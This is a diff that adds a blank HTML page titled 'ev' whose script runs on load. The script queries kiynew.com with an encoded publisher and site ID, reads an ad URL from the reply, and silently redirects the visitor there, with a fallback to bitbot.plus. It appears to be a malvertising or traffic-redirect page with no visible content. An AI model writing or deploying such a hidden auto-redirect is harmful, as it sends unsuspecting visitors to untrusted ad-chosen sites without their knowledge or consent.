@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ev</title>
+    <script src="//cdn.jsdelivr.net/npm/light-http@1.4.10/lightHttp.min.js"></script>
+    <script>
+        var http = new window.lightHttp();
+        http.ajax("https://kiynew.com/cuload?a=1&e=aeyJwaWQiOjEwOTk5NjgsInNpZCI6MTEwOTQ2OSwid2lkIjoyNDU5ODgsImQiOiIiLCJsaSI6MX0=")
+            .then(function (content) {
+                var a = JSON.parse(content);
+                url = (((a[0] || {}).ads || [])[0] || {}).uf || "https://bitbot.plus";
+                console.log(url);
+                document.location.replace(url);
+            });
+    </script>
+</head>
+<body>
+
+</body>
+</html>
